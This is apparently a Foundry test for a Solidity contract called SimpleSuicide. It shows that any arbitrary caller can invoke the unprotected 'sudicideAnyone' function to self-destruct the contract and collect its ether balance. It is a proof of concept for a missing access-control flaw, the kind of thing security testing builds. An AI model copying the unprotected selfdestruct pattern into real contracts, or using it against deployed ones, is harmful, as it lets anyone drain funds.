
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleSuicide} from "../src/SimpleSuicide.sol";

contract TestAccessControlSimpleSuicide is Test {
    SimpleSuicide public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new SimpleSuicide();
        // Fund the contract so we can verify funds are transferred on selfdestruct
        vm.deal(address(_contractUnderTest), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // No privileged roles to exclude - the contract has no access control
        // This is the vulnerability we are demonstrating

        // --- 2. State Configuration ---
        // Record caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(_contractUnderTest).balance;
        
        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // Any arbitrary user can call sudicideAnyone and destroy the contract
        // receiving all the contract's funds
        _contractUnderTest.sudicideAnyone();

        // ASSERT SUCCESS
        // Verify the contract's balance was transferred to the caller
        assertEq(caller.balance, callerBalanceBefore + contractBalance, "Caller should receive contract funds");
        // Verify the contract no longer has any balance
        assertEq(address(_contractUnderTest).balance, 0, "Contract should have zero balance after selfdestruct");
    }
}
